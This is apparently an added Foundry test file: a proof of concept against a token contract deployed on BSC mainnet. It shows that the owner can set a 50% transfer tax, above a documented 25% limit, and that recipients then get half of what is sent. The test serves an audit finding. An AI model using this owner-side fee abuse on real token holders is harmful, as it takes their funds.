@@ -1,0 +1,83 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IElonAllyToken {
+    function owner() external view returns (address);
+    function setTaxFeePercent(uint256 taxFee) external;
+    function setMaxTxAmount(uint256 maxTxAmount) external;
+    function excludeFromMaxTx(address account) external;
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function totalSupply() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    // Deployed token on BSC mainnet
+    IElonAllyToken constant TOKEN = IElonAllyToken(0x41bEC9e10A5bb2F2BBaece4e9491466930874C88);
+
+    function setUp() public {
+        vm.label(address(TOKEN), "ElonAllyToken");
+        address owner = TOKEN.owner();
+        vm.label(owner, "Owner");
+    }
+
+    function testOwnerCanExceedMaxFeeLimit() public {
+        address owner = TOKEN.owner();
+
+        // --- 1. Owner sets an excessive tax fee (50%) ---
+        vm.startPrank(owner);
+        // Remove potential hurdles: ensure max tx amount is huge
+        TOKEN.setMaxTxAmount(1e30);
+        // Set tax fee to 50%, exceeding any reasonable limit (25% mentioned in report)
+        TOKEN.setTaxFeePercent(50);
+        vm.stopPrank();
+
+        // --- 2. Prepare a non-excluded user with tokens ---
+        address user1 = address(0x1111);
+        address user2 = address(0x2222);
+        vm.label(user1, "User1");
+        vm.label(user2, "User2");
+
+        // Owner transfers tokens to user1 (owner is fee-excluded, so full amount)
+        uint256 seedAmount = 1_000_000 * 1e9; // 1 million tokens (decimals = 9)
+        vm.prank(owner);
+        TOKEN.transfer(user1, seedAmount);
+
+        // Owner must exclude user1 from maxTx (due to buggy require in _transfer)
+        vm.prank(owner);
+        TOKEN.excludeFromMaxTx(user1);
+
+        // --- 3. User1 transfers tokens to User2 ---
+        uint256 transferAmount = 100_000 * 1e9; // 100k tokens
+        uint256 user1BalanceBefore = TOKEN.balanceOf(user1);
+        uint256 user2BalanceBefore = TOKEN.balanceOf(user2);
+
+        vm.prank(user1);
+        TOKEN.transfer(user2, transferAmount);
+
+        uint256 user1BalanceAfter = TOKEN.balanceOf(user1);
+        uint256 user2BalanceAfter = TOKEN.balanceOf(user2);
+
+        // --- 4. Verify that the tax fee was applied ---
+        // Sender loses exactly the full transfer amount (reflection model)
+        assertEq(user1BalanceAfter, user1BalanceBefore - transferAmount, "Sender balance should decrease by full amount");
+
+        // Receiver gets only half due to 50% tax
+        uint256 user2Received = user2BalanceAfter - user2BalanceBefore;
+        uint256 expectedReceived = transferAmount * 50 / 100; // 50% tax => recipient gets 50%
+        console.log("User2 received:", user2Received);
+        console.log("Expected received (50% fee):", expectedReceived);
+
+        // Tolerance of 1 wei accounts for potential rounding in reflection rate
+        assertApproxEqAbs(user2Received, expectedReceived, 1, "Recipient did not receive the correct reduced amount (50% fee)");
+
+        // --- 5. Confirm that the owner was able to set a fee above the documented limit ---
+        // The test itself demonstrates that the owner can call setTaxFeePercent(50) without revert.
+        // No explicit maximum exists in the code.
+        assertTrue(true, "Owner successfully set tax fee to 50% (exceeding 25% limit)");
+    }
+}
+```
